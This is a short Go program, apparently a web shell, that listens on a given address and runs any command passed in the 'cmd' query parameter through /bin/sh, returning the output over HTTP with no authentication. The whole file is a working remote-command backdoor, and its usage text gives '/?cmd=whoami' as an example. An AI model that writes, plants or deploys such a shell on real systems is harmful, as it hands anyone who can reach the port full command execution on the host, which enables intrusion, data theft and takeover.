package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
)

var shell = "/bin/sh"
var shellArg = "-c"

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage: %s <listenAddress>\n", os.Args[0])
		fmt.Printf("Example: %s localhost:8080\n", os.Args[0])
		os.Exit(1)
	}

	http.HandleFunc("/", requestHandler)
	log.Println("Listening for HTTP requests.")
	err := http.ListenAndServe(os.Args[1], nil)
	if err != nil {
		log.Fatal("Error creating server. ", err)
	}
}

func requestHandler(writer http.ResponseWriter, request *http.Request) {
	// Get command to execute from GET query parameters
	cmd := request.URL.Query().Get("cmd")
	if cmd == "" {
		fmt.Fprintln(
			writer,
			"No command provided. Example: /?cmd=whoami",
		)
		return
	}

	log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
	fmt.Fprintf(writer, "You requested command: %s\n", cmd)

	// Run the command
	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()
	if err != nil {
		fmt.Fprintf(writer, "Error with command.\n%s\n", err.Error())
	}

	// Write output of command to the response writer interface
	fmt.Fprintf(writer, "Output: \n%s\n", output)
}
